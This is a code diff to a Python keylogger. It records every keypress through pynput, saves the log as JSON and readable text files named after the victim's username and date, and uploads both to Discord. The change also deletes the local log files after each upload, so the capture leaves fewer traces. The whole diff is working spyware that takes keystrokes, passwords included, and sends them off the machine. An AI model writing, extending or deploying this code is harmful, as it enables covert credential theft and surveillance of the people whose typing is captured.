@@ -1,3 +1,5 @@
+import os
+
 from pynput.keyboard import Listener, Key
 
 from classes.Host import Host
@@ -20,6 +22,7 @@ def should_send_file(key):
     object_size = get_object_size(key_log)
     if len(key_log) <= 2:
         return False
+    # using this size for testing purposes
     return object_size >= 0.002 and (key == Key.enter or key == Key.space)
 
 
@@ -28,12 +31,16 @@ def on_press(key):
     key_log[time] = str(key).replace("'", "")
 
     print(get_object_size(key_log))
-    # using this size for testing purposes
     if should_send_file(key):
         write_keys_to_file(key_log, json_file, host)
-        discord.send_file(json_file, "log_" + host.username + "_" + get_current_date() + "_json.txt")
+        current_date = get_current_date()
+        json_file_name = "log_" + host.username + "_" + current_date + "_json.txt"
+        legible_text_file_name = "log_" + host.username + "_" + current_date + ".txt"
+        discord.send_file(json_file, json_file_name)
         write_legible_text_to_file(key_log, legible_text_file)
-        discord.send_file(legible_text_file, "log_" + host.username + "_" + get_current_date() + ".txt")
+        discord.send_file(legible_text_file, legible_text_file_name)
+        os.remove(json_file)
+        os.remove(legible_text_file)
         key_log.clear()
 
 
